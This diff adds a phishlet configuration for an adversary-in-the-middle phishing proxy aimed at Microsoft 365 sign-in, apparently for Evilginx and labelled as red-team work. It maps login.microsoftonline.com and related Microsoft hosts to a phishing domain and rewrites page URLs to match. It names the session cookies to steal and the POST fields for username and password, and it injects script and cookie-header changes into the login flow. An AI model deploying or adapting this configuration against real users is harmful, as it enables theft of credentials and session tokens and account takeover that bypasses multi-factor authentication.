@@ -1,0 +1,58 @@
+name: office365
+author: redteam-devin
+min_ver: 2.3.0
+
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msauth.net', session: false, is_landing: false}
+  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msauthimages.net', session: false, is_landing: false}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoft.com', session: false, is_landing: false}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: false, is_landing: false}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'office.com', session: false, is_landing: false}
+  - {phish_sub: 'sts', orig_sub: 'sts', domain: 'company.com', session: true, is_landing: false}  # Optional ADFS
+
+sub_filters:
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://login.microsoftonline.com', replace: 'https://login.__PHISHING_DOMAIN__', mimes: ['text/html', 'application/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'login.microsoftonline.com', replace: 'login.__PHISHING_DOMAIN__', mimes: ['text/html', 'application/javascript']}
+  - {triggers_on: 'sts.company.com', orig_sub: 'sts', domain: 'company.com', search: 'sts.company.com', replace: 'sts.__PHISHING_DOMAIN__', mimes: ['text/html', 'application/javascript']}  # ADFS optional
+
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
+  - domain: '.microsoftonline.com'
+    keys: ['MSPRequ', 'MSCC', 'MSPOK', 'MSPBack']
+
+credentials:
+  username:
+    key: 'loginfmt'
+    search: 'loginfmt'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: 'passwd'
+    type: 'post'
+
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+
+logout:
+  domain: 'login.microsoftonline.com'
+  path: '/common/oauth2/logout'
+
+force_post:
+  - path: '/common/oauth2/login'
+
+js_inject:
+  - trigger_domains: ['login.microsoftonline.com']
+    script: |
+      document.cookie.split(";").forEach(function(c) {
+        document.cookie = c.replace(/^ +/, "")
+          .replace(/=.*/, "=;expires=" + new Date(Date.now()+31536000000).toUTCString() + ";path=/");
+      });
+
+http_response_modifier:
+  - trigger_domains: ['login.microsoftonline.com']
+    headers:
+      - key: 'Set-Cookie'
+        value: 'Max-Age=31536000; SameSite=None; Secure'
